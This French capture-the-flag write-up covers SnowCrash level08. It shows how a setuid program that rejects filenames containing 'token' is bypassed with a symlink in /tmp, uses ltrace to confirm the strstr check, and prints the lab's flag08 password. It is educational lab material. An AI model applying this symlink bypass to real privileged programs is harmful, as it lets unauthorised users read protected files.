# Explication

On commence par `ls` dans notre home :

```sh
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Deux choses :
- Un executable avec les droits de `flag08`
- Un fichier token que je ne peux pas lire faute de droit , seul `flag08` le peut.

En executant `./level08` voici ce qu'il se passe :

```sh
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

Il attend donc un fichier, pourquoi pas lui envoyer le fichier `token` ?

```sh
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Bien entendu cela ne fonctionne pas mais pourquoi ? Peut etre parce qu'il essaye d'ouvrir le fichier mais que nous on n'en a pas les droits ? Etrange car le programme tourne avec les droits de `flag08` donc cela devrait etre possible.

J'essaye maintenant avec un fichier que j'ai cree :

```sh
level08@SnowCrash:~$ echo "test" > /tmp/test_file
level08@SnowCrash:~$ ./level08 /tmp/test_file
test
```

Ok cela fonctionne et semble simplement print le contenu du fichier, a ce stade j'en deduit simplement que le flag se trouve dans le fichier token et que le but est de faire passer se fichier au programme en contournant sa securite.

Je fais donc un autre test pour m'assurer que ce n'est pas un simple check du nom de fichier :

```sh
level08@SnowCrash:~$ echo "token" > /tmp/my_token_file
level08@SnowCrash:~$ ./level08 /tmp/my_token_file
You may not access '/tmp/my_token_file'
```

Et bien ce semble etre le cas , ce n'est pas un probleme de droits simplement que le mot `"token"` semble etre rejete au parsing et nous renvoyer une erreur, il faudrait donc essayer changer le nom du fichier `token` mais je ne peux pas le faire faute de droits.

Comme c'est seulement le nom qui pose probleme et pas le fichier en lui meme on peut faire un `symlink` et au parsing ce sera le nom du lien qui sera verifie.

```sh
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/bypass
level08@SnowCrash:~$ ./level08 /tmp/bypass
quif5eloekouj29ke0vouxean
```

On peut egalement verifier les appels fait aux librairies avec `ltrace`

```sh
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffffcf4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                 = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)             = 27
```

On voit bien que c'est bien une simple comparaison et que le mot `token` est hardcode pour etre rejete.

Le mot de passe de `flag08` est donc `quif5eloekouj29ke0vouxean`.
